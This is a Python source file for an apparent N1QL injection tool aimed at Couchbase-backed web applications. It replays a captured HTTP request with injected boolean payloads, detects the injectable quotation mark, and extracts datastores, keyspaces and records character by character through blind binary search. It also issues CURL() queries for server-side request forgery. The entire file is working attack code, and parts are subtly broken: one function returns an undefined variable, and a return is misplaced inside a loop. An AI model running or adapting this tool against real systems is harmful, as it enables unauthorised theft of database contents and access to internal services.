import sys
import json
import math
import logging
from urllib.parse import urljoin, quote
from requests import Session, Request
from .data_manager import DataManager

chars = [chr(x) for x in range(128)]  # only ASCII in demo tool -> it is possible to extend this to full UTF
#chars = [chr(x) for x in range(2**16)]  # full UTF -> longer extraction time

class N1QLInjector:
    strcmp2_tmpl = '''133337333' OR '%s'>SUBSTR(ENCODE_JSON((SELECT * FROM ((%s)) as O ORDER BY META(`O`).id)),%s,1) OR '1'='0'''
    singlequote = '\''
    doublequote = '"'

    def __init__(self, request_file_path, host, success_keyword, injection_point=b'*i*', encoding='utf-8', proxy=None, verify=True, data_manager=None, quote=singlequote):
        self.session = Session()
        self.request_file_path = request_file_path
        self.host = host
        self.injection_point = injection_point
        self.encoding = encoding
        self.base_request = self.prepare_base_request()
        if proxy:
            self.proxies = {
                'http': proxy,
                'https': proxy,
            }
        else:
            self.proxies = None
        self.verify = verify
        self.success_keyword = success_keyword
        self.data_manager = data_manager if data_manager else DataManager()
        self.quote = quote

    def send(self, request):
        if self.proxies:
            r = self.session.send(request, proxies=self.proxies, verify=self.verify, stream=True)
            return r
        else:
            r = self.session.send(request, verify=self.verify, stream=True)
            return r

    def prepare_base_request(self):
        with open(self.request_file_path, 'rb') as f:
            content = f.read()
        data_raw = b''
        if b'\n\n' in content:
            headers_raw, data_raw = content.split(b'\n\n', 1)
            data_raw = data_raw.strip()
        else:
            headers_raw = content

        headers = dict()
        headers_lines = headers_raw.splitlines()
        header_top = headers_lines[0].decode(self.encoding)
        method, _, http_v = header_top.split(' ')
        url = headers_lines[0].split(b' ')[1]
        headers_bot = headers_lines[1:]
        for line in headers_bot:
            key = line.split(b':', 1)[0].strip().replace(b':', b'').decode(self.encoding)
            value = line.split(b':', 1)[1].strip().decode(self.encoding)
            headers[key] = value

        self.url = urljoin(self.host, url)
        request = Request(method, self.url, headers=headers)
        prepped = self.session.prepare_request(request)
        if len(data_raw) > 0:
            prepped.body = data_raw
        else:
            prepped.body = None
        return prepped

    def inject_payload(self, payload, quotation_mark=None):
        ''' currently only one occurence of injection point is supported '''
        if quotation_mark:
            payload = payload.replace(self.singlequote, quotation_mark)
        else:
            payload = payload.replace(self.singlequote, self.quote)
        method = self.base_request.method
        url = self.base_request.url.encode(self.encoding)
        if type(payload) is not bytes:
            payload = payload.encode(self.encoding)

        url = url.replace(self.injection_point, payload)
        request = Request(method, url.decode(self.encoding))
        prep_req = self.session.prepare_request(request)
        if prep_req.body is not None:
            prep_req.body = self.base_request.body.replace(self.injection_point, payload)
        payload = payload.decode(self.encoding)
        replace_chars = self.injection_point.decode(self.encoding)
        for header_name in self.base_request.headers:
            prep_req.headers[header_name] = self.base_request.headers[header_name].replace(replace_chars, payload)

        prep_req.prepare_content_length(prep_req.body)
        return prep_req

    def extract_from_db_binsearch(self, n1ql_query, tmpl_lt=strcmp2_tmpl):
        data = ''
        pos = 0
        while True:
            flag_end = False

            l_char = 0
            r_char = len(chars) - 1

            while l_char != r_char:
                mid_char = math.ceil((l_char + r_char)/2)
                cur_char = self._get_unicode_rep(chars[mid_char])
                query_inject = tmpl_lt % (cur_char, n1ql_query, pos)
                request = self.inject_payload(query_inject)
                r = self.send(request)
                if self.is_success(r):
                    r_char = mid_char - 1
                else:
                    l_char = mid_char

                if l_char == r_char:
                    cur_char = self._get_unicode_rep(chars[l_char-1])
                    query_inject = tmpl_lt % (cur_char, n1ql_query, pos)
                    request = self.inject_payload(query_inject)
                    r = self.send(request)
                    if self.is_success(r):
                        mid_char = l_char - 1
                    else:
                        mid_char = r_char
            
            self.data_manager.append_data(chars[mid_char])
            self.data_manager.present()
            pos += 1
            try:
                data = json.loads(self.data_manager.container)
                break
            except ValueError:
                continue
            
            return data

    def extract_datastores(self):
        tmpl_lt = '''133337333' OR '%s'>SUBSTR(ENCODE_JSON((%s)),%s,1) OR '1'='0'''
        query = "SELECT * FROM system:datastores ORDER by id"
        data = self.extract_from_db_binsearch(query, tmpl_lt=tmpl_lt)
        return data

    def extract_keyspaces(self, datastore_id):
        tmpl_lt = '''133337333' OR '%s'>SUBSTR(ENCODE_JSON((%s)),%s,1) OR '1'='0'''
        query = "SELECT name FROM system:keyspaces WHERE datastore_id = '%s' ORDER by id" % datastore_id
        data = self.extract_from_db_binsearch(query, tmpl_lt=tmpl_lt)
        return data

    def extract_data(self, keyspace):
        query = "SELECT * FROM `%s` AS T ORDER BY META(T).id LIMIT 1" % keyspace
        data = self.extract_from_db_binsearch(query)
        return data

    def _get_unicode_rep(self, character):
        return r'\u%04x' % ord(character)

    def is_success(self, response):
        try:
            if self.success_keyword in str(response.raw.headers) or self.success_keyword in str(response.raw.data):
                return True
        except:
            return False
        return False
    
    def confirm_injection(self):
        ''' performs very simple injections and identify quotation characters '''
        # server error
        error_indicators = [
            "syntax error",
            "\"fatal\": ",
        ]
        # send not malicious data
        basic_payload = "some_data_to_test_request"
        request = self.inject_payload(basic_payload)
        basic_response = self.send(request)
                
        payloads_single_quote = [
            "' ", "some_data' ", "''", "' OR testt"
        ]
        payloads_double_quote = [
            "\" ", "some_data\" ", "\"", "\" OR testt"
        ]
        error_status = None
        for payload in payloads_single_quote:
            request = self.inject_payload(payload, quotation_mark=self.singlequote)
            response = self.send(request)
            if response.status_code != basic_response.status_code or any(ind in str(response.raw.data) for ind in error_indicators):
                self.quote = self.singlequote
                return True
        for payload in payloads_double_quote:
            request = self.inject_payload(payload, quotation_mark=self.doublequote)
            response = self.send(request)
            if response.status_code != basic_response.status_code or any(ind in str(response.raw.data) for ind in error_indicators):
                self.quote = self.doublequote
                return True
        return False
    
    def curl(self, endpoint, options_dict=None, tmpl_lt=strcmp2_tmpl):
        ''' Performs CURL query with given parameters '''
        # https://docs.couchbase.com/server/current/n1ql/n1ql-language-reference/curl.html#options
        if options_dict:
            ssrf_query = "SELECT CURL('%s', %s)" % (endpoint, options_dict)
        else:
            ssrf_query = "SELECT CURL('%s')" % endpoint
        ssrf_query = ssrf_query.replace("'", self.quote).replace("\"", self.quote)
        logging.debug("[*] Executing CURL: %s" % ssrf_query)
        r = self.extract_from_db_binsearch(ssrf_query)
        return data